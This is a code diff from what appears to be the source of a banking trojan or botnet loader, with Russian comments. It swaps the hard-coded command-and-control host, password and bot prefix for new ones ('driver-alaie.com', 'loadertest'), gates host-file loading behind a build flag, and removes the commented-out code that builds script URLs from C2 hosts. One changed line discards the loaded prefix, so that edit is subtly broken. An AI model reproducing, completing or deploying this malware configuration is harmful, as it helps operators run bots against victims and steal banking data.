@@ -89,13 +89,17 @@ namespace CONFIGDEBUGSTRINGS
 //	char MainPassword[MAX_PASSWORD_SIZE + 1] = "rGV01X8JFAfjcwTh";
 
 
-	char BOT_MAINHOSTS_ARRAY[MAX_MAINHOSTS_BUF_SIZE] = "rus.zika.in\0";
-	char MainPassword[MAX_PASSWORD_SIZE + 1] = "bRS8yYQ0APq9xfzC";
-	char BOT_PREFIX[MAX_PREFIX_SIZE + 1] = "rbttest";
+//	char BOT_MAINHOSTS_ARRAY[MAX_MAINHOSTS_BUF_SIZE] = "rus.zika.in\0";
+//	char MainPassword[MAX_PASSWORD_SIZE + 1] = "bRS8yYQ0APq9xfzC";
+//	char BOT_PREFIX[MAX_PREFIX_SIZE + 1] = "rbttest";
+//	char Delay[MAX_DELAY_SIZE + 1]       = "1";
+
+
+
+	char BOT_MAINHOSTS_ARRAY[MAX_MAINHOSTS_BUF_SIZE] = "driver-alaie.com\0";
+	char MainPassword[MAX_PASSWORD_SIZE + 1] = "cbvhX3tJ0k8HwnMy";
+	char BOT_PREFIX[MAX_PREFIX_SIZE + 1] = "loadertest";
 	char Delay[MAX_DELAY_SIZE + 1]       = "1";
-
-
-
 
 	#ifdef USE_BANKING_HOSTS
 		char BOT_BANKHOSTS_ARRAY[MAX_BANKHOSTS_BUF_SIZE] = "rus.zika.in\0";
@@ -237,7 +241,12 @@ string GetPrefix(bool CheckBankingMode)
 			return BOT_PREFIX_BANK;
 	#endif
 
-	string Prefix = LoadPrefixFromFile(Bot->PrefixFileName().t_str());
+	string Prefix;
+
+	#ifdef USE_HOSTS_FILE
+		LoadPrefixFromFile(Bot->PrefixFileName().t_str());
+	#endif
+
 	if (Prefix.IsEmpty())
 	{
 		Prefix = BOT_PREFIX;
@@ -371,31 +380,8 @@ int GetDelay()
         	StrCopy(BOT_MAINHOSTS_ARRAY, "localhost");
 	}
 #endif
-
-
 //-----------------------------------------------------------------------------
-/*
-PCHAR GetActiveHost()
-{
-	// Функция возвращает активный (доступный) хост
 
-	CFGDBG("Cofig", "Получаем активный хост.");
-
-	#ifndef DEBUGCONFIG
-		PCHAR Result  = NULL;
-
-		// Первым этапом пытаемся получить хост из файла
-		if (Hosts::GetActiveHostFormFile(NULL, Result))
-		{
-			CFGDBG("Cofig", "Получили хост из файла");
-			return Result;
-		}
-	#endif
-
-	return GetActiveHostFromBuf(BOT_MAINHOSTS_ARRAY, BOTPARAM_HASH_MAINHOSTS);
-
-}  */
-//-----------------------------------------------------------------------------
 
 string GetActiveHost(bool CheckBankingMode)
 {
@@ -403,7 +389,7 @@ string GetActiveHost(bool CheckBankingMode)
 	bool FileExists = false;
 	string Host;
 
-	#ifndef DEBUGCONFIG
+	#if !defined(DEBUGCONFIG) && defined(USE_HOSTS_FILE)
 		PCHAR H  = NULL;
 
 		// Первым этапом пытаемся получить хост из файла
@@ -621,64 +607,6 @@ PCHAR GetBotScriptURL(DWORD Script, PCHAR Path, bool CheckBankingMode)
 
 	return Result;
 }
-//----------------------------------------------------------------------------
-
-
-//-----------------------------------------------------
-//  GetBankingScriptURL-  Функция возвращает адрес
-//		скрипта с проверкой включенного режима Banking
-//-----------------------------------------------------
-/*string GetBankingScriptURL(DWORD Script, bool CheckBankingMode)
-{
-	string Host;
-
-
-	#ifndef DEBUGCONFIG
-		PCHAR H  = NULL;
-
-		// Первым этапом пытаемся получить хост из файла
-		if (Hosts::GetActiveHostFormFile(NULL, H))
-		{
-			CFGDBG("Cofig", "Получили хост из файла");
-			Host = H;
-			STR::Free(H);
-		}
-	#endif
-
-
-	if (Host.IsEmpty())
-	{
-		// Получаем хосты из вшитых данных
-		if (CheckBankingMode && IsBankingMode())
-		{
-			Host = GetActiveHostFromBuf2(BOT_BANKHOSTS_ARRAY,
-										 BOTPARAM_HASH_BANKHOSTS,
-										 BOTPARAM_ENCRYPTED_BANKHOSTS);
-		}
-		else
-		{
-			Host = GetActiveHostFromBuf2(BOT_MAINHOSTS_ARRAY,
-										 BOTPARAM_HASH_MAINHOSTS,
-										 BOTPARAM_ENCRYPTED_MAINHOSTS);
-		}
-    }
-
-	string URL;
-	if (!Host.IsEmpty())
-	{
-		bool PathCreated = false;
-		PCHAR Path = GetScriptByID(Script, PathCreated);
-
-		URL = HTTPProtocol;
-		URL += Host;
-		URL += Path;
-
-		if (PathCreated)
-            STR::Free(Path);
-	}
-	return URL;
-}
-*/
 //----------------------------------------------------------------------------
 
 
